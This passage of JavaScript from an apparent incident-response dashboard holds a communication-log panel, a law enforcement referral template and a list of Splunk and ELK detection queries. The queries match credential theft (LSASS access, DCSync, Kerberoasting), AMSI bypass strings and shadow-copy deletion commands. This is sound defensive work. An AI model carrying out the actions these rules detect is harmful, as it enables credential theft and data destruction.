      {name: 'Law Enforcement Referral', text: 'TO: [FBI IC3 / LOCAL LAW ENFORCEMENT]\nFROM: [ORGANIZATION]\nDATE: [DATE]\nRE: Cybercrime Report\n\nWe wish to report a cybersecurity incident for potential criminal investigation.\n\nIncident type: [RANSOMWARE/DATA THEFT/UNAUTHORIZED ACCESS]\nDate discovered: [DATE]\nEstimated date of intrusion: [DATE]\n\nEvidence preserved:\n- Network logs covering [DATE RANGE]\n- Forensic images of [N] affected systems\n- Malware samples [IF APPLICABLE]\n\nFinancial impact: $[AMOUNT]\nData compromised: [DESCRIPTION]\n\nContact: [NAME] [TITLE] [PHONE] [EMAIL]'},
    ];
    c.innerHTML =
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">COMMUNICATION LOG</span><span style="flex:1"></span><span style="color:var(--mut)">' + mission.comms.length + ' entries</span></div>' +
        '<div class="ag-panel-b">' +
          '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:10px">' +
            '<select class="ag-sel" id="ag-commtype"><option>Internal</option><option>Executive</option><option>Customer</option><option>Regulatory</option><option>Law Enforcement</option><option>Vendor</option><option>Media/PR</option></select>' +
            '<input class="ag-inp" id="ag-commto" placeholder="Recipient...">' +
            '<select class="ag-sel" id="ag-commchan"><option>Email</option><option>Phone</option><option>In-person</option><option>Slack/Teams</option><option>Secure Channel</option></select>' +
          '</div>' +
          '<textarea class="ag-textarea" id="ag-commmsg" placeholder="Communication details..." rows="3"></textarea>' +
          '<button class="ag-btn" id="ag-commlog" style="margin-top:8px">LOG COMMUNICATION</button>' +
          '<div style="margin-top:12px">' +
            (mission.comms.length > 0 ?
            '<table class="ag-tbl"><thead><tr><th>Time</th><th>Type</th><th>Channel</th><th>Recipient</th><th>Summary</th></tr></thead><tbody>' +
            mission.comms.slice().reverse().map(function(e) {
              return '<tr><td style="white-space:nowrap;font-size:.62rem">' + esc(e.time) + '</td><td><span class="ag-badge ag-med">' + esc(e.type) + '</span></td><td style="font-size:.65rem">' + esc(e.channel) + '</td><td style="font-size:.65rem">' + esc(e.to) + '</td><td style="font-size:.65rem;color:var(--mut)">' + esc(e.msg.substring(0, 80)) + (e.msg.length > 80 ? '...' : '') + '</td></tr>';
            }).join('') +
            '</tbody></table>' :
            '<div style="color:var(--mut);text-align:center;padding:16px;font-size:.75rem">No communications logged yet.</div>') +
          '</div>' +
        '</div>' +
      '</div>' +
      '<div class="ag-panel" style="margin-top:10px">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">COMMUNICATION TEMPLATES</span></div>' +
        '<div class="ag-panel-b" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px">' +
          TEMPLATES.map(function(t, i) {
            return '<button class="ag-btn ag-btn-ghost" data-tpl="' + i + '" style="text-align:left;font-size:.65rem;padding:10px">' + esc(t.name) + '</button>';
          }).join('') +
        '</div>' +
      '</div>';

    c.querySelector('#ag-commlog').onclick = function() {
      var msg = c.querySelector('#ag-commmsg').value.trim();
      if (!msg) return;
      mission.comms.push({
        time: new Date().toLocaleString(),
        type: c.querySelector('#ag-commtype').value,
        channel: c.querySelector('#ag-commchan').value,
        to: c.querySelector('#ag-commto').value || 'Unspecified',
        msg: msg
      });
      mission.actions.push({time: new Date().toLocaleTimeString(), text: 'Comms: logged ' + c.querySelector('#ag-commtype').value + ' to ' + (c.querySelector('#ag-commto').value || 'unspecified')});
      updateMission(mission);
      renderCommsLog(c, mission);
    };

    c.querySelectorAll('[data-tpl]').forEach(function(b) {
      b.onclick = function() {
        c.querySelector('#ag-commmsg').value = TEMPLATES[parseInt(b.dataset.tpl)].text;
      };
    });
  }

  // ========== SIEM QUERY DATABASE (for Defense tab expansion) ==========
  var SIEM_QUERIES = [
    {name: 'Brute Force Login', category: 'Authentication', splunk: 'index=security sourcetype=WinEventLog:Security EventCode=4625 | stats count by Account_Name src_ip | where count > 5 | sort -count', elk: 'event.code: "4625" | stats count by user.name, source.ip | where count > 5'},
    {name: 'Successful Login After Multiple Failures', category: 'Authentication', splunk: 'index=security EventCode=4625 OR EventCode=4624 | transaction src_ip maxspan=10m | where eventcount>5 AND EventCode=4624', elk: '(event.code: "4625" OR event.code: "4624") | transaction source.ip'},
    {name: 'Impossible Travel', category: 'Authentication', splunk: 'index=security EventCode=4624 | iplocation src_ip | stats earliest(_time) as first latest(_time) as last values(Country) as countries by Account_Name | where mvcount(countries)>1', elk: 'event.code: "4624" | geoip source.ip | stats earliest, latest, countries by user.name'},
    {name: 'PowerShell Encoded Command', category: 'Execution', splunk: 'index=sysmon EventCode=1 Image="*powershell*" CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*" | table _time ComputerName User CommandLine', elk: 'process.name: "powershell.exe" AND process.command_line: (*-enc* OR *-EncodedCommand*)'},
    {name: 'Suspicious Process Creation', category: 'Execution', splunk: 'index=sysmon EventCode=1 (Image="*cmd.exe" OR Image="*powershell*" OR Image="*wscript*" OR Image="*cscript*" OR Image="*mshta*") ParentImage="*winword*" OR ParentImage="*excel*" OR ParentImage="*outlook*" | table _time ParentImage Image CommandLine User', elk: 'event.code: "1" AND process.parent.name: (winword.exe OR excel.exe OR outlook.exe) AND process.name: (cmd.exe OR powershell.exe)'},
    {name: 'LSASS Memory Access', category: 'Credential Access', splunk: 'index=sysmon EventCode=10 TargetImage="*lsass.exe" NOT SourceImage="*csrss.exe" NOT SourceImage="*lsass.exe" | table _time SourceImage TargetImage GrantedAccess', elk: 'event.code: "10" AND process.target.name: "lsass.exe" AND NOT process.name: (csrss.exe OR lsass.exe)'},
    {name: 'New Service Installed', category: 'Persistence', splunk: 'index=security EventCode=7045 | table _time Service_Name Service_File_Name Service_Type Service_Start_Type Account_Name', elk: 'event.code: "7045" | table timestamp, winlog.event_data.ServiceName, winlog.event_data.ImagePath'},
    {name: 'Scheduled Task Created', category: 'Persistence', splunk: 'index=security EventCode=4698 | table _time SubjectUserName TaskName TaskContent', elk: 'event.code: "4698"'},
    {name: 'Registry Run Key Modified', category: 'Persistence', splunk: 'index=sysmon EventCode=13 TargetObject="*CurrentVersion\\\\Run*" | table _time Image TargetObject Details', elk: 'event.code: "13" AND registry.path: *CurrentVersion\\\\Run*'},
    {name: 'WMI Event Subscription', category: 'Persistence', splunk: 'index=sysmon EventCode=19 OR EventCode=20 OR EventCode=21 | table _time EventCode Operation User', elk: 'event.code: ("19" OR "20" OR "21")'},
    {name: 'PsExec Remote Execution', category: 'Lateral Movement', splunk: 'index=sysmon EventCode=1 Image="*PSEXESVC*" OR Image="*psexec*" | table _time ComputerName User Image CommandLine', elk: 'process.name: (PSEXESVC.exe OR psexec.exe)'},
    {name: 'RDP Lateral Movement', category: 'Lateral Movement', splunk: 'index=security EventCode=4624 Logon_Type=10 | stats count by src_ip Account_Name dest | where count>1 | sort -count', elk: 'event.code: "4624" AND winlog.event_data.LogonType: "10"'},
    {name: 'WinRM Remote Shell', category: 'Lateral Movement', splunk: 'index=security EventCode=4624 Logon_Type=3 AuthenticationPackageName="Negotiate" | search dest_port=5985 OR dest_port=5986', elk: 'event.code: "4624" AND destination.port: (5985 OR 5986)'},
    {name: 'Large Outbound Data Transfer', category: 'Exfiltration', splunk: 'index=proxy | stats sum(bytes_out) as total by src_ip dest_ip | where total>104857600 | eval MB=round(total/1048576,2) | sort -MB', elk: 'network.bytes > 104857600 | stats sum by source.ip, destination.ip'},
    {name: 'DNS Tunneling Detection', category: 'Exfiltration', splunk: 'index=dns | eval querylen=len(query) | where querylen>50 | stats count avg(querylen) as avg_len by query_type src_ip | where count>100 AND avg_len>40', elk: 'dns.question.name: * | eval length(dns.question.name) > 50 | stats count by source.ip'},
    {name: 'Cloud Storage Upload', category: 'Exfiltration', splunk: 'index=proxy (dest="*.s3.amazonaws.com" OR dest="*.blob.core.windows.net" OR dest="*.storage.googleapis.com") method=PUT | stats count sum(bytes_out) as total by src_ip dest', elk: 'destination.domain: (*.s3.amazonaws.com OR *.blob.core.windows.net) AND http.request.method: "PUT"'},
    {name: 'Ransomware File Extension Change', category: 'Impact', splunk: 'index=sysmon EventCode=11 | regex TargetFilename="\\.(encrypted|locked|crypt|enc|cry|lock|dharma|cerber|locky|wannacry)$" | stats count by ComputerName | where count>10', elk: 'event.code: "11" AND file.extension: (encrypted OR locked OR crypt OR enc)'},
    {name: 'Shadow Copy Deletion', category: 'Impact', splunk: 'index=sysmon EventCode=1 CommandLine="*vssadmin*delete*shadows*" OR CommandLine="*wmic*shadowcopy*delete*" | table _time ComputerName User CommandLine', elk: 'process.command_line: (*vssadmin*delete*shadows* OR *wmic*shadowcopy*delete*)'},
    {name: 'Kerberoasting TGS Request', category: 'Credential Access', splunk: 'index=security EventCode=4769 Ticket_Encryption_Type=0x17 Service_Name!="krbtgt" | stats count by Account_Name Service_Name Client_Address | where count>3', elk: 'event.code: "4769" AND winlog.event_data.TicketEncryptionType: "0x17"'},
    {name: 'DCSync Attack', category: 'Credential Access', splunk: 'index=security EventCode=4662 AccessMask=0x100 Properties="*Replicating Directory Changes*" | table _time SubjectUserName ObjectName', elk: 'event.code: "4662" AND winlog.event_data.AccessMask: "0x100" AND winlog.event_data.Properties: *Replicating*'},
    {name: 'Golden Ticket Usage', category: 'Credential Access', splunk: 'index=security EventCode=4769 | where Ticket_Options="0x40810000" AND Service_Name="krbtgt" | table _time Account_Name Client_Address', elk: 'event.code: "4769" AND winlog.event_data.TicketOptions: "0x40810000"'},
    {name: 'Process Injection (CreateRemoteThread)', category: 'Defense Evasion', splunk: 'index=sysmon EventCode=8 | where SourceImage!=TargetImage | table _time SourceImage TargetImage NewThreadId StartAddress', elk: 'event.code: "8" AND NOT process.name: process.target.name'},
    {name: 'AMSI Bypass Attempt', category: 'Defense Evasion', splunk: 'index=sysmon EventCode=1 CommandLine="*AmsiUtils*" OR CommandLine="*amsiInitFailed*" OR CommandLine="*SetField*NonPublic*" | table _time Image CommandLine', elk: 'process.command_line: (*AmsiUtils* OR *amsiInitFailed*)'},
    {name: 'Suspicious DNS Query', category: 'Command and Control', splunk: 'index=dns query_type=TXT | stats count by src_ip query | where count>10 | sort -count', elk: 'dns.question.type: "TXT" | stats count by source.ip, dns.question.name | where count > 10'},
    {name: 'Firewall Rule Modification', category: 'Defense Evasion', splunk: 'index=security EventCode=4946 OR EventCode=4947 OR EventCode=4948 | table _time RuleName RuleAttr ChangedBy', elk: 'event.code: ("4946" OR "4947" OR "4948")'},
    {name: 'Audit Log Cleared', category: 'Defense Evasion', splunk: 'index=security EventCode=1102 | table _time SubjectUserName SubjectDomainName', elk: 'event.code: "1102"'},
    {name: 'Account Lockout', category: 'Authentication', splunk: 'index=security EventCode=4740 | table _time TargetUserName CallerComputerName', elk: 'event.code: "4740"'},
    {name: 'User Added to Admin Group', category: 'Privilege Escalation', splunk: 'index=security EventCode=4728 OR EventCode=4732 OR EventCode=4756 | table _time TargetUserName GroupName SubjectUserName', elk: 'event.code: ("4728" OR "4732" OR "4756")'},
    {name: 'Suspicious Parent-Child Process', category: 'Execution', splunk: 'index=sysmon EventCode=1 (ParentImage="*svchost.exe" AND (Image="*cmd.exe" OR Image="*powershell*")) OR (ParentImage="*spoolsv.exe" AND Image!="*splwow64*") | table _time ParentImage Image CommandLine', elk: '(process.parent.name: "svchost.exe" AND process.name: (cmd.exe OR powershell.exe)) OR (process.parent.name: "spoolsv.exe")'},
    {name: 'Network Share Enumeration', category: 'Discovery', splunk: 'index=security EventCode=5140 | stats dc(ShareName) as shares by SubjectUserName src_ip | where shares>3 | sort -shares', elk: 'event.code: "5140" | stats distinct_count(winlog.event_data.ShareName) by user.name, source.ip'},
  ];

  render();
}
